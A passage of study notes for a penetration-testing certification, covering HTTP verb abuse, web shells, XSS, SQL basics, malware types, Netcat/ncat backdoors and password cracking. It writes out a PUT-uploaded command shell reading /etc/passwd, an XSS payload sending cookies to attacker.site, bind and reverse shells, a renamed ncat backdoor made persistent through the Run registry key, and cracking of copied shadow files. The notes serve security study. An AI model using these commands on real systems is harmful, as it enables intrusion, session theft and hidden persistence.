probing.</div></li></ul><li><div>Now that we have seen some HTTP verbs, its time to see how to use them to exploit a misconfigured web server.</div></li><ul><li><div>Firstly, a pentester must enumerate all the available methods or verbs.</div></li><li><div>How?</div></li><ul><li><div>OPTIONS message with Netcat.</div></li><ul><li><div>nc victim.site 80</div></li><li><div>OPTIONS / HTTP/1.1</div></li></ul><li><div>Look in the <span style="font-weight: bold;">Allow</span> part of the header to see what is available.</div></li></ul></ul><li><div><span style="font-weight: bold;">Exploiting DELETE</span></div></li><ul><li><div>To do this you have to specify the file you want to delete from the server; this shows how an unauthenticated DELETE method can remove an arbitrary resource on the server</div></li><ul><li><div>nc victim.site 80</div></li><li><div>DELETE /path/to/resource.txt HTTP/1.0</div></li><li><div><br/></div></li><li><div><br/></div></li><li><div>HTTP/1.1 200 OK</div></li></ul><li><div>Here we see an example of deleting a login page, therefore making it impossible for users to sign in</div></li><ul><li><div>nc victim.site 80</div></li><li><div>DELETE /login.php HTTP/1.0</div></li><li><div><br/></div></li><li><div>HTTP/1.1 200 OK</div></li></ul></ul><li><div><span style="font-weight: bold;">Exploiting PUT</span></div></li><ul><li><div>Exploiting a PUT method is more <span style="font-weight: bold;">complex</span> because you have to know the size of the file you want to upload on the server.  To do that you can use the Unix utility <span style="font-style: italic;">wc</span> (word counter) with its <span style="font-style: italic;">-m</span> parameter to count how long, in bytes, your payload is</div></li><ul><li><div>wc -m payload.php</div></li><li><div>20 payload.php</div></li></ul><li><div>You can then use the size you received to build the PUT message. In the following example, you see how to upload a page displaying information about the PHP installation on a server.</div></li><ul><li><div><span style="font-weight: bold;">nc victim.site 80</span></div></li><li><div><span style="font-weight: bold;">PUT</span> /payload.php HTTP/1.0</div></li><li><div>Content-type: text/html</div></li><li><div>Content-length: 20</div></li><li><div><br/></div></li><li><div><br/></div></li><li><div><span style="font-weight: bold;">&lt;?php phpinfo () ; ?&gt;</span></div></li></ul><li><div>Let's see how to code a shell and upload it to the victim server via <span style="font-weight: bold;">PUT</span></div></li><ul><li><div>We have built an effective .php that will request a command to open up a cmd prompt.</div></li><li><div>You can use it by passing your command via the cmd GET parameter</div></li><ul><li><div>victim.site/shell.php?<span style="font-weight: bold;">cmd=ls</span></div></li></ul><li><div>The shell has the same permissions as the web server it runs on. For example we can write a file.</div></li><ul><li><div>victim.site/shell.php?<span style="font-weight: bold;">cmd=echo 'test string' &gt; /tmp/testfile</span></div></li></ul><li><div>And we can read it</div></li><ul><li><div>victim.site/shell.php?<span style="font-weight: bold;">cmd=cat /tmp/testfil</span>e</div></li></ul><li><div>And we can even read a system file</div></li><ul><li><div>victim.site/shell.php?cmd=<span style="font-weight: bold;">cat/etc/passwd</span></div></li></ul></ul></ul><li><div>Misconfigured HTTP verbs are becoming rare in web servers. This is because of the evolution of web technologies and better default configuration files.</div></li><ul><li><div>On the other hand you can still find a lot of misconfigured HTTP methods in embedded devices, IP cameras, digital video recorders and other &quot;smart&quot; devices.</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Directories and Files enumeration</span></div><ul><li><div>Why?</div></li><ul><li><div>Find and utilise testing features</div></li><li><div>Exploit information saved in backup or old files</div></li><li><div>Find hidden resources</div></li></ul><li><div>Users and search engines can not find resources that are not linked by a web page on the internet. If you make a /new site no one will find it until the person who made it publishes a link to that</div></li><ul><li><div>That being said, even unlinked files and directories can be accessed by anyone knowing their URL.</div></li></ul><li><div><span style="font-weight: bold;">Enumeration</span> helps you find those 'hidden' resources that often contain</div></li><ul><li><div>New and untested features</div></li><li><div>Backup files</div></li><li><div>Testing information</div></li><li><div>Developer's notes</div></li><ul><li><div>these are often left there because &quot;no one knows their URL&quot;</div></li></ul></ul><li><div>Discovering unpublished, old or backup files can give you  lot of information and sometimes access to very sensitive information.</div></li><li><div>There are 2 ways to enumerate resources</div></li><ul><li><div>Brute-force</div></li><li><div>Dictionary attacks</div></li></ul><li><div>Dictionary attacks are faster and use common file names, directory names and file extensions.</div></li><ul><li><div>.bak</div></li><li><div>.old</div></li><li><div>.txt</div></li><li><div>.xxx</div></li></ul><li><div>A very common tool to perform web enumeration is <span style="font-weight: bold;">OWASP Dirbuster</span></div></li><ul><li><div>It is a java application that can perform web resources enumeration</div></li><li><div>You have to set your target (URL of site you want to test)</div></li></ul><li><div>There is a linux alternative to <span style="font-weight: bold;">dirbuster</span> called <span style="font-weight: bold;">dirb</span></div></li><ul><li><div>It is a command line tool which also helps to enumerate web resources within an application</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Netcat Video</span></div><ul><li><div>which nc - shows you where it is stored</div></li><li><div>Netcat is both a server and a client</div></li><li><div>nc -lvp 8888</div></li><ul><li><div>-l is listen</div></li><li><div>-v is verbose</div></li><li><div>-p is listen on port 8888</div></li><ul><li><div>-u is for UDP if you want it</div></li></ul></ul><li><div>It will start listening on 0.0.0.0 which is &quot;all network interfaces&quot;</div></li><li><div>Now, in a different terminal window type</div></li><ul><li><div>nc -v 127.0.0.1 8888</div></li></ul><li><div>Now you can chat between them and they will appear in the other</div></li><li><div>For UDP</div></li><ul><ul><li><div>nc -lvup 9999</div></li></ul><li><div>other</div></li><ul><li><div>nc -vu 127.0.0.1</div></li></ul><li><div>This is connecting with UDP</div></li></ul><li><div>nc -lvp 8888 &gt; received.txt</div></li><li><div>Don't know why you would want to but you can echo and then pipe the output into the nc command effectively meaning that it will establish a connection just in order to send that one file</div></li></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><ul><li><div>How to do this to get a shell?</div></li><ul><li><div>we need to use the -e option which executes a programme upon successful connection and allows the client to interact with it.</div></li><ul><li><div>nc -lvp 1337 -e /bin/bash</div></li></ul><li><div>Go to other window</div></li><ul><li><div>nc -v 127.0.0.1</div></li></ul><li><div>Now it is a bind shell! Much more than a chat.</div></li></ul></ul><div><br/></div><div><span style="font-weight: bold;">Dirbuster Video</span></div><ul><li><div>Applications - Web Applications - Web crawlers - Dirbuster</div></li><ul><li><div>Enter URL</div></li><li><div>Set HTTP method - just GET? just HEAD? mix of both?</div></li><li><div>Select number of tests</div></li><li><div>Select type of scan</div></li><ul><li><div>Pure brute force?</div></li><li><div>Dictionary attack?</div></li><ul><li><div>Dictionary?</div></li><ul><li><div>Wordlists folder inside of Dirbuster</div></li><ul><li><div>desktop</div></li><li><div>usr</div></li><li><div>share</div></li><li><div>dirbuster</div></li><li><div>wordlists</div></li><li><div>directory list lowercase2.3</div></li></ul></ul></ul><li><div>file extension - bak, old</div></li><li><div>dir start with /</div></li><li><div>leave be recusive and brute force on</div></li><li><div>Start</div></li></ul><li><div>users.bak is juicy</div></li><li><div>so is &quot;conf.old&quot;</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Dirb Video</span></div><ul><li><div>Pretty much the same as Dirbuster but it runs from the CLI</div></li><li><div>It takes word lists and requests it from the target applications and then dependnig on the response it gets will let you know what it finds</div></li><li><div>Specify the target?</div></li><ul><li><div>dirb <a href="http://google.com/">http://google.com</a></div></li><ul><li><div>It automatically uses the common wordlist. Want a different one?</div></li></ul></ul><li><div>cd /usr/share/dirb/wordlists</div></li><li><div>ls</div></li><ul><li><div>dirb <a href="http://google.com/">http://google.com</a> /usr/share/dirb/wordlists/small.txt</div></li></ul><li><div>You may want to look for custom wordlists on the internet - github. Non-english for example.</div></li><li><div>-a is a custom USER_AGENT string. You may need to use it if the application requires you to define a USER_AGENT</div></li><li><div>You can also go to <a href="http://useragentstring.com/">useragentstring.com</a> and find one there to make it look like a regular browser. Can copy and paste it to dirb options.</div></li><ul><li><div>dirb <a href="http://google.com/">http://google.com</a> -a *INSERT*</div></li></ul><li><div>-p lets you specify a proxy</div></li><ul><li><div>dirb http;//192.168.0.33 - <a href="http://127.0.0.1/">http://127.0.01</a> this will send its requests via the proxy so you can analyse them on there.</div></li></ul><li><div>May want to passa  cookie to find more resources?</div></li><li><div>-u can be used to authenticate</div></li><li><div>-H can be used to send specific headers</div></li><li><div>-r means not recursive i.e stop at the first subdirectory</div></li><li><div>-z is a delay, useful for WAFs</div></li><li><div>-s is silent mode</div></li><li><div>-X is for comma separated extensions, -x specifies the path to the word list. These will cycle through each word and then add any extension to the end and try that</div></li><li><div>-o allows you to save it to an output file</div></li></ul><div><br/></div><div><span style="font-weight: bold;">Google Hacking</span></div><ul><li><div>Why?</div></li><ul><li><div>Information gathering without contacting the targets</div></li><li><div>Find hidden resources</div></li></ul><li><div>A pentester can use google's advanced query comand (aka Google Dorks) to find specific resources.</div></li><ul><li><div>inurl:admin intitle:login</div></li><ul><li><div>This is good for finding admin area login pages</div></li></ul></ul><li><div>Useful commands</div></li><ul><li><div>site: = include only result on a given hostname</div></li><li><div>intitle: = filters according to the title of a page</div></li><li><div>inurl: = similar but works on the URL of a resource</div></li><li><div>filetype: = filters by using the file extension of a resource i.e .pdf or .xls</div></li><li><div>AND,OR, &amp;, | = logical operators to combine your expressions i.e</div></li><ul><li><div>site:example.com OR site:another.com</div></li></ul><li><div>- = filter out a keyword or a commands result from the query</div></li></ul></ul><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Cross site-scripting</span></div><ul><li><div>What can it do?</div></li><ul><li><div>Modify content of the site at run-time</div></li><li><div>Inject malicious content</div></li><li><div>Steal the cookies, and therefore session, of a user</div></li><li><div>Perform actions on the web application as if it were a legitimate user</div></li></ul><li><div>There are 3 actors involved in an XSS attack</div></li><ul><li><div>Vulnerable site</div></li><li><div>Victim user</div></li><li><div>Pentester</div></li></ul><li><div>The vulnerable web app is what makes the XSS possible. It happens when a web app uses unfiltered user input to build output content displayed to the end users.</div></li><ul><li><div>This lets an attacker control the output HTML and JavaScript code, thus attacking the application.</div></li></ul><li><div>The user input can be any parameter coming from the client side of the web app</div></li><ul><li><div>Request headers</div></li><li><div>Cookies</div></li><li><div>Form inputs</div></li><li><div>POST parameters</div></li><li><div>GET parameters</div></li><ul><li><div>All these inputs should be validated server-side by well-implemented security functions that should sanitise or filter users input</div></li><li><div>To prevent XSS you should <span style="font-weight: bold;">never, ever trust user input</span></div></li></ul></ul><li><div>Most of the time, the victim of an XSS attack are the users or visitors of a site. It involves injecting malicious code into the output of a webpage. This malicious code is then executed or rendered by the browser of the visiting users.</div></li><li><div>Most of the time a victim does not realise that an attack is in progress - they are very subtle and do not involve any visible change on the vulnerable site.</div></li><li><div>How does it work?</div></li><ul><li><div>The malicious users makes the victims browser load malicious content</div></li><li><div>They can then perform operations on their behalf like buying a product or changing a password</div></li><li><div>They could also steal their session cookie and could therefore impersonate the victim on a vulnerable site.</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><ul><li><div><span style="font-weight: bold;">Finding an XSS</span></div></li><ul><li><div>First things first, you have to look at <span style="font-weight: bold;">every</span> user input and test if it somehow displays on the output of the web application.</div></li><ul><li><div>In the example they have given, they input text into a search parameter and it is submitted before being displayed in the webapp at the <span style="font-weight: bold;">reflection point</span></div></li><ul><li><div>i.e You searched for X</div></li></ul><li><div>The searched string is passed to the web app through a GET parameter</div></li></ul><li><div>So, first you need to find a reflection point, you have to understand if you can inject HTML code and see if it somehow gets to the output of the page; this lets you control the output page</div></li><li><div>You can use any valid HTML tag and try to understand if it gets to the page</div></li><ul><li><div>Looking at the HTML sources of the output page helps to understand how to build an XSS payload.</div></li><li><div>Sometimes it is just a matter of injecting a harmless &lt;i&gt;, &lt;pre&gt; or &lt;plaintext&gt;</div></li><ul><li><div>&lt;i&gt; test string and look for <span style="font-style: italic;">test string</span> output</div></li></ul></ul><li><div>To test XSS you can inject some valid HTML/JavaScript code like:</div></li><ul><li><div>&lt;script&gt;alert('XSS')&lt;/script&gt;</div></li></ul><li><div>In order to exploit an XSS that you have found, you need to know the <span style="font-weight: bold;">type</span> of XSS attack you are carrying out. They can be <span style="font-weight: bold;">reflected, persistent</span> or <span style="font-weight: bold;">DOM based</span>. For the eJPT we will just be looking at reflected and persistent</div></li></ul></ul><div><br/></div></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Reflected XSS</span></div><ul><li><div>Reflected attacks happen when the malicious payload is carried <span style="font-weight: bold;">inside the request</span> that the browser of the victim sends to the vulnerable website.</div></li><ul><li><div>They could be triggered by posting a link on a social network or via a phishing campaign. When users click on the link, they trigger the attack.</div></li></ul><li><div>The XSS we just saw is a reflected XSS. In that example we could craft a link to the search page and embed the payload in the <span style="font-weight: bold;">find</span> GET parameter.</div></li><ul><li><div>http://victim.site/search.php?find=&lt;payload&gt;</div></li></ul><li><div>It is known as <span style="font-weight: bold;">Reflected</span> because an input field of the HTTP request sent by the browser gets immediately reflected to the output page</div></li><li><div>Some browsers (Chrome) have a reflected  XSS filter build in. This means they will not run <span style="font-weight: bold;">some</span> XSS reflected attacks.</div></li><ul><li><div>They can only filter trivial and known XSS attacks - they can be bypassed.</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Persistent XSS attacks</span></div><ul><li><div>These occur when the payload is sent to the web server and then stored.</div></li><ul><li><div>When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload</div></li><ul><li><div>It is called persistent because the malicious code gets delivered each and every time a web browser hits the &quot;injected&quot; web page.</div></li></ul></ul><li><div>The most common vector for persistent attacks are HTML forms that submit content to the web server and then display the content back to the users</div></li><ul><li><div>Elements such as comments, user profiles, forum posts etc are potential vectors for XSS attacks.</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Cookie stealing via XSS</span></div><ul><li><div>As we know from the web apps module. JavaScript can access cookies if they do not have the <span style="font-weight: bold;">HttpOnly</span> flag enabled.</div></li><ul><li><div>This means that an XSS attack can be used to steal the cookies.</div></li><li><div>In many cases stealing a cookie means stealing a user session.</div></li></ul><li><div>For example, you can display the current cookies with</div></li><ul><li><div>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div></li></ul><li><div>Taking this one step further, the following code can send cookies to an attacker-controlled site</div></li><ul><li><div>&lt;script?</div><div>var i = new Image ();</div><div>i.src=&quot;http://attacker.site/log.php?q=&quot;+document.cookie;</div><div>&lt;/script&gt;</div></li><li><div>This script generates an image object and points its <span style="font-weight: bold;">src</span> to a script on the attackers server (attacker.site)</div></li><ul><li><div>The browser cannot tell in advance if the source is a real image, so it loads and executes the script, even without displaying any image! Therefore what remains is the <span style="font-style: italic;">+document.cookie</span> and so the cookie is sent to attacker.site</div></li><li><div>the <span style="font-style: italic;">log.php</span> bit saves the cookie in a text file on the attacker.site. This is what it looks like</div></li><ul><li><div>&lt;?php</div><div>$filname=&quot;/tmp/log.txt&quot;;</div><div>$fp=fopen($filename, &quot;a&quot;);</div><div>$cookie=$_GET['q'];</div><div>fwrite($ft, $cookie);</div><div>fclose ($fp);</div><div>?&gt;</div></li></ul></ul></ul></ul><div><br/></div><div><br/></div><div><span style="font-weight: bold;">XSS VIDEO</span></div><ul><li><div>Find a field, look for search and comment areas.</div></li><li><div>Lets begin</div></li><ul><li><div>Test the search box</div></li><li><div>Search query is printed on the page - this is good!</div></li><li><div>Now lets check if the input is sanitised.</div></li><ul><li><div>&lt;h1&gt; Hi &lt;/h1&gt;</div></li></ul><li><div>On this example, it prints it large meaning it hasn't been sanitised</div></li><ul><li><div>If we inspect the source code of the page and look at the HTML we can see is being run.</div></li></ul></ul><li><div>Now we need to test if JavaScript code works too.</div></li><ul><li><div>&lt;script&gt;alert('XSS')&lt;/script&gt;</div></li><ul><li><div>If this works then there has been no sanitisation.</div></li></ul></ul><li><div>Okay  so we know it runs JavaScript. Let's have a look at printing the cookie</div></li><ul><li><div>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div></li><li><div>From this we can print the PHPSESSID</div></li></ul><li><div>Now we can load up any payload, craft a URL and lure the victim into clicking on the link and carrying it out for us.</div></li><li><div>Now lets have a look at the comment section. First we need to login.</div></li><li><div>So lets begin with this</div></li><ul><li><div>start with the HTML script again</div></li><li><div>now test the JavaScript</div></li><li><div>test the cookie</div></li></ul><li><div>Now remember, this is a stored/persistent XSS so it will load every time that you open the page.</div></li><li><div>Okay, so we know the website is vulnerable to both of these, now lets try and steal a cookie</div></li><ul><li><div>get a custom get.php script and put it on the attack site</div></li><li><div>create the  payload for the website</div></li><ul><li><div>This will get the victims browser to create an object, and then will address the objects source as the target get.php site.  </div></li></ul><li><div>If you are successful in getting an admin to look at the page you will have their cookies and now you can login with their cookies therefore impersonating them.</div></li><ul><li><div>Get firebug</div></li><li><div>Click the cookies tab</div></li><li><div>Click edit</div></li><li><div>Paste the cookies in the field</div></li></ul></ul><li><div>hack.me is a good website to practice more XSS.</div></li></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">SQL Injections</span></div><ul><li><div>Why?</div></li><ul><li><div>Unrestricted access to web app data</div></li><li><div>Steal credentials</div></li><li><div>Full control of a webapp</div></li></ul><li><div>Most webapps use some sort of <span style="font-weight: bold;">back-end database</span> to store the data they process. To interact with the database, we use <span style="font-weight: bold;">Structure Query Language (SQL).</span></div></li><li><div><span style="font-weight: bold;">SQL Injection (SQLi)</span> attacks allow an unauthorised users to <span style="font-weight: bold;">take control over SQL statements</span> used by a web app.</div></li><ul><li><div>This kind of attack has a huge impact because getting control over a backend database means controlling</div></li><ul><li><div>User credentials</div></li><li><div>Data of the web app</div></li><li><div>Credit card numbers</div></li><li><div>Shopping transactions</div></li><li><div>much more</div></li></ul></ul><li><div>First, lets look at SQL statements. They look like the following</div></li><ul><li><div>&gt; <span style="font-weight: bold;">SELECT</span> name, description <span style="font-weight: bold;">FROM</span> products <span style="font-weight: bold;">WHERE</span> id=9;</div></li></ul><li><div>This queries the database, asking for the <span style="font-weight: bold;">name</span> and <span style="font-weight: bold;">description</span> of a record in the <span style="font-weight: bold;">products</span> table. In this example the selected record will have an <span style="font-weight: bold;">id</span> value equal to 9.</div></li><li><div>In order to better understand SQLi you need to also know the basic syntax of a <span style="font-weight: bold;">SELECT</span> statement:</div></li><ul><li><div>&gt;<span style="font-weight: bold;"> SELECT</span> &lt;columns list&gt; <span style="font-weight: bold;">FROM</span> &lt;table&gt; <span style="font-weight: bold;">WHERE</span> &lt;condition&gt;;</div></li></ul><li><div>You also need to know <span style="font-weight: bold;">UNION</span> commands which performs a union between 2 results</div></li><ul><li><div>&gt; &lt;SELECT statement&gt; <span style="font-weight: bold;">UNION &lt;</span>other select statement&gt;;</div></li></ul><li><div>Finally, there are 2 strings you can use to commemt a line in SQL</div></li><ul><li><div>#</div></li><li><div>-- </div></li><ul><li><div>&gt;SELECT field FROM table; # this is a comment</div></li><li><div>&gt;SELECT field FROM table; --   this is a comment too</div></li></ul></ul><li><div>These examples show how to use SQL when querying a database from it's console. To perform the same tasks from within a web app the app must:</div></li><ul><li><div><span style="font-weight: bold;">connect</span> to the database</div></li><li><div><span style="font-weight: bold;">submit</span> the query to the database</div></li><li><div><span style="font-weight: bold;">retrieve</span> the results.</div></li></ul></ul><div><br/></div></div><div><br/></div></span>
</div>
<hr>
<a name="1170"/>

<div>
<span><div><div><div><span style="font-weight: bold;">Malware</span></div><ul><li><div>Why?</div></li><ul><li><div>Use the right malware incarnation during an engagement</div></li><li><div>Keep test under ROE</div></li><li><div>Maintain access to compromised machines</div></li></ul><li><div>Aims of malware?</div></li><ul><li><div>DoS</div></li><li><div>Spying</div></li><li><div>Unauthorised control</div></li><li><div>Others</div></li></ul><li><div>Types of malware?</div></li><ul><li><div>Virus</div></li><ul><li><div>Small piece of code that spreads from computer to computer without any direct action or authorisation by the owners of the infected machines. Usually they copy themselves to special sectios of the hard disk, inside legitimate programmes or documents and run whenever that file or program is opened. </div></li></ul><li><div>Trojan Horse</div></li><ul><li><div>Embedded in seemingly harmless file.</div></li><li><div>The most common Trojans used by pentesters are <span style="font-weight: bold;">backdoors</span> - this lets an attacker get a shell on the infected system</div></li></ul><li><div>Backdoors</div></li><ul><li><div>Software made up of 2 components:</div></li><ul><li><div>server </div></li><li><div>backdoor client</div></li></ul><li><div>Backdoor server runs on the victim machine listening on the network and accepting connections. </div></li><li><div>Client usually runs on the attacker machine and is used to connect to the backdoor.</div></li><li><div>The 2 famous, old-school backdoors are <span style="font-weight: bold;">NetBus</span> and <span style="font-weight: bold;">SubSeven</span></div></li><ul><li><div>They allow the attacker to browse the victims hard-drive, upload and download files, execute programs and other activities. </div></li></ul><li><div>Firewalls vs Backdoors?</div></li><ul><li><div>If a good sysadmin blocks connections from the internet then the attacker will not be able to connect to the backdoor.</div></li><li><div>Connection attempts from the Internet to an Internal machine will raise some alarms. </div></li><ul><li><div>A welll-done backdoor will make the traffic look legit. </div></li><li><div>The easiest way to do this is to use a <span style="font-weight: bold;">connect-back</span> <span style="font-weight: bold;">backdoor</span></div></li></ul></ul><li><div>Connect-back/Reverse Backdoor</div></li><ul><li><div>Used to bypass firewalls. </div></li><li><div>Instead of the victim machine acting as a server and listening to the clients command, it acts as a client and the attacker machine the server. </div></li><li><div>This means the traffic could just look like regular port 80 traffic. </div></li></ul></ul></ul><li><div>Rootkit</div></li><ul><li><div>Malware designed to hide itself from the users and antivirus in order to completely subvert the OS from functioning. </div></li><li><div>It lets an attacker maintain privileged access to the victim machine without it being noticed. </div></li></ul><li><div>Bootkit</div></li><ul><li><div>A rootkit which circumvents OS proctection by executing during the bootstrap phase. They start before the OS so they get completet control over the machine and OS. </div></li></ul><li><div>Adware</div></li><ul><li><div>Annoying software that shos advertisements to users</div></li></ul><li><div>Spyware</div></li><ul><li><div>Collects information about user activity such as</div></li><ul><li><div>The OS on the machine</div></li><li><div>Visited websites</div></li><li><div>Passwords</div></li></ul><li><div>Info is usually sent back to a log collections server controlled by the attacker. </div></li></ul><li><div><span style="font-weight: bold;">Greyware</span></div></li><ul><li><div>General term used to indicate malware which does not fall under a specific category</div></li></ul><li><div><span style="font-weight: bold;">Dialer</span></div></li><ul><li><div>software that tries to dial numbers on dial-up connections in order to collect money from the victims phone bills - nowadays they target smartphonea</div></li></ul><li><div>Keylogger</div></li><ul><li><div>Software which records every keystroke on the remote victim machine. They can</div></li><ul><li><div>record keystrokes</div></li><li><div>record the window name where the victim was typing</div></li><li><div>save the keystrokes in a log file on the victim machine</div></li><li><div>send the logs to a server controlled by penetration testers</div></li></ul><li><div>Subject to the same restrictions that firewalls pose to backdoors - must be configured to bypass firewalls. </div></li><li><div>There are also <span style="font-weight: bold;">hardware keyloggers</span> and <span style="font-weight: bold;">rootkit keyloggers</span>. </div></li><ul><li><div>Hardware keylogger</div></li><ul><li><div>Small devices you can install between a keyboard and a computer. </div></li><li><div>They log keystrokes in internal memory. After some time the attacker will return to retrieve it</div></li></ul><li><div>Rootkit Keylogger</div></li><ul><li><div>Software keyloggers working  at the Kernel level by hijacking the OSs APIs to record keystrokes.</div></li><li><div>Every time a key is pressed on a keyboard, a particular function on the OS Kernel is called through a mechanism called <span style="font-weight: bold;">an interrupt</span></div></li><li><div>First it logs the key and then it tells the OS to do what it is meant to do. </div></li></ul></ul></ul><li><div>Bots</div></li><ul><li><div>Small pieces of software that get installed on millions of internet-connected machines to perform actions in unison. </div></li><li><div>They are controlled by <span style="font-weight: bold;">Command and Control servers. </span></div></li></ul><li><div>Ransomware</div></li><ul><li><div>Encrypts a computer or smartphone content with a secret key. Pay them to get it back</div></li></ul><li><div><span style="font-weight: bold;">Data stealing malware</span></div></li><ul><li><div>Most of the time this is targeted to a specific company and tailor-made to work in their environment. </div></li></ul><li><div>Worms</div></li><ul><li><div>Spread over the network by exploiting OS and software vulnerabilities. </div></li><li><div>Can also exploit default credentials and misconfigurations to attack a service or machine</div></li><li><div>They usually form part of another type of malware. </div></li></ul></ul><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Backdoor Video</span></div><ul><li><div>For this we will use <span style="font-weight: bold;">ncat</span></div></li><li><div>You need ncat on both of the machines</div></li><ul><li><div>Hide the ncat file somewhere boring in the victim OS and then run it </div></li><ul><li><div>run with -l for listen and -p for the port</div></li><li><div>-e to execute the file and then you need to type the name of the program you want to execute, for us we want a shell so cmd.exe</div></li><li><div>winconfig -l -p 5555 -e cmd.exe</div></li></ul><li><div>Now switch back to the attacker machine</div></li><ul><li><div>ncat 192.168.102.152 5555</div></li></ul><li><div>Now we have a shell</div></li></ul><li><div><span style="font-weight: bold;">Reverse connection</span></div></li><ul><li><div>On the attacker</div></li><ul><li><div>ncat -l -p 5555 -v</div></li></ul><li><div>On the victim </div></li><ul><li><div>winconfig -e cmd.exe 192.168.24.42 5555</div></li></ul></ul><li><div><span style="font-weight: bold;">Persistence</span></div></li><ul><li><div>On the attack</div></li><ul><li><div>ncat -l -p 5554 -v</div></li></ul><li><div>On the victim</div></li><ul><li><div>Start -&gt; regedit </div></li><li><div>Navigate to HKEY LOCAL SOFTWARE MICROSOFT WINDOWS CURRENT VERSION RUN</div></li><li><div>New -&gt; String value</div></li><li><div>Name it winconfig</div></li><li><div>Double click </div></li><li><div>C:\Windows\System32\winconfig.exe 192.168.102.145 5554 -e cmd.exe</div></li><li><div>Click okay</div></li></ul></ul><li><div><span style="font-weight: bold;">Metasploit/Meterpreter</span></div></li><ul><li><div>run metasploit</div></li><li><div>use exploit/windows/local/s4u_persistence</div></li><li><div>maybe come back to this once I have spent some time with metasploit</div></li></ul><li><div><span style="font-weight: bold;">General</span></div></li><ul><li><div>If you are running in metasploit (any maybe normal backdoor) you can download a file by typing download +name routeOnLocalMachine</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><b>Password Attacks</b></div><ul><li><div>Why?</div></li><ul><li><div>Gain persistent access to an exploited machine</div></li><li><div>Choose the right method to attack passwords</div></li><li><div>Exploit re-used credentials</div></li></ul><li><div>OS's have to store passwords.  They are usually stored inside files and databases. They are stored in an encrypted form - to be specific a one-way encryption algorithm. </div></li><li><div>Cryptographic hashing functions are used to transform a password from its clear-text form to an encrypted and safe to store form. </div></li><li><div>The 2 password cracking methods are</div></li><ul><li><div>Brute force attacks</div></li><li><div>Dictionary attacks</div></li></ul><li><div>Brute Force Attacks</div></li><ul><li><div>Only way to be certain of finding someone's password. </div></li><li><div>First it goes through the lower case letters, then the upper case letters, then numbers, then symbols. </div></li><li><div>Once it goes through all of these it will increase the length and continue</div></li><li><div>Given enough time a brute force attack will <b>always</b> be successful but it takes a long time</div></li></ul><li><div>John the Ripper</div></li><ul><li><div>This is the most popular one and has features like sessions etc. </div></li><li><div>It can be used for loads of different encryption types </div></li><li><div>It is fast </div></li><li><div>Lets look at some examples of how we would use this</div></li><ul><li><div>Lets say that we got using an unauthorised method. We make a copy of the password files</div></li><ul><li><div>/etc/passwd = info about user accounts</div></li><li><div>/etc/shadow = actual password hashes</div></li></ul><li><div>John needs the username and password hashes to be in the same file so we use the unshadow utility - it comes with John the Ripper</div></li><ul><li><div>unshadow passwd shadow &gt; crackme</div></li></ul><li><div>Usually a password file contains passwords of multiple users. You can use the -users switch to select certain ones</div></li><ul><li><div>john -incremental -users:&lt;userslist&gt; &lt;file to crack&gt;</div></li></ul><li><div>To brute force the password of the <b>victim</b> user you type</div></li><ul><li><div>john -incremental -users:victim crackme</div></li><li><div>john --show crackme</div></li></ul></ul></ul><li><div>Dictionary attacks</div></li><ul><li><div>Dictionary of common passwords </div></li><li><div>You need</div></li><ul><li><div>a password file containing the hashed password to crack</div></li><li><div>a dictionary or wordlist</div></li><li><div>a tool to test every password in the list against the password file. </div></li></ul><li><div>They can also provide <b>mangle</b> options which at variations to letters etc</div></li><li><div>You can run dictionary attacks with John by using the argument -wordlist</div></li><ul><li><div>john -wordlist&lt;=customWordlistFile&gt; &lt;filetocrack&gt;</div></li></ul><li><div>with mangling</div></li><ul><li><div>john -wordlist&lt;=customWordlistFile&gt; -rules &lt;filetocrack&gt;</div></li><li><div>john -wordlist=mywordlist -rules -users=victim,victim2 crackme</div></li></ul><li><div>You can get the seclist project which has some cool password wordlists </div></li><ul><li><div>apt-get install seclists</div></li><ul><li><div>/usr/share/seclists/Passwords/</div></li></ul></ul></ul><li><div>Rainbow tables</div></li><ul><li><div>This is the middle ground between the 2</div></li><li><div>It is a table containing links between the results of a run of one hashing functions and another</div></li><li><div>The limit of rainbow tables is the storage space needed to gurantee successful cracking sessions. </div></li><li><div>They work well with short passwords</div></li><li><div><b>ophcrack</b> is a tool aimed at Windows password recovery</div></li></ul></ul><div><br/></div></div><div><br/></div><div><br/></div><div><br/></div><div><b>John the Ripper Video</b></div><ul><li><div>First you have to unshadow</div></li><li><div>then</div></li><ul><li><div>john --wordlist=/usr/share/john/password.list hashes</div></li><li><div>john --show hashes</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><b>Hashcat Video</b></div><ul><li><div>Can rely on a GPU. </div></li><li><div>Better to work in a non-VM environment. </div></li></ul><div><br/></div><div><br/></div><div><b>Buffer Overflow</b></div><ul><li><div>Why?</div></li><ul><li><div>Remote code execution</div></li><li><div>Privilege escalation</div></li><li><div>Understanding basics of memory corruption attacks</div></li></ul><li><div>Many attacks widely exploit buffer overflow vulnerabilities. </div></li><li><div>How do they work?</div></li><ul><li><div>They take control of the execution flow of a piece of software or a routine of the OS</div></li><li><div>This effectively means that they force it to behave differently compared to what the application author designed. </div></li></ul><li><div>What can it do?</div></li><ul><li><div>App/OS crash (DoS)</div></li><li><div>Privilege escalaltion</div></li><li><div>Remote code execution</div></li><li><div>Security feature bypass</div></li></ul><li><div>What is a buffer?</div></li><ul><li><div>An area of RAM reserved for temporary data storage. Data such as </div></li><ul><li><div>User input</div></li><li><div>Parts of a video file</div></li><li><div>Server 